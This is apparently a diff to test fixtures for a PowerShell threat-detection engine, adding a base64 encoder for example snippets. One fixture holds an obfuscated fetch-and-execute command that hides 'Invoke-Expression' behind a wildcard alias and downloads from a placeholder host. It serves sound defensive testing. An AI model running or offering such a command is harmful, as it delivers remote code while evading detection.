@@ -6,6 +6,7 @@ reachable.
 
 from __future__ import annotations
 
+import base64
 import json
 import threading
 from collections.abc import Callable
@@ -123,6 +124,12 @@ def detection_response_json(findings: list[dict]) -> str:
     return json.dumps({"findings": findings})
 
 
+def _b64(text: str) -> str:
+    """Match the real `example_snippet_b64` schema `DETECTION_SYSTEM_PROMPT`
+    asks for -- see `engine.detect._decode_example_snippet`."""
+    return base64.b64encode(text.encode("utf-8")).decode("ascii")
+
+
 def wildcard_finding_dict(finding_id: str = "f1") -> dict:
     return {
         "id": finding_id,
@@ -134,7 +141,7 @@ def wildcard_finding_dict(finding_id: str = "f1") -> dict:
             "object directly via the call operator, so the literal string "
             "'Invoke-Expression' never appears in the command line."
         ),
-        "example_snippet": "&(Get-Alias i*x) (irm https://example.com/a)",
+        "example_snippet_b64": _b64("&(Get-Alias i*x) (irm https://example.com/a)"),
         "confidence": 0.92,
         "attack_mapping": "T1027.010 (parent: T1027)",
         "source_ref": "paragraph 2",
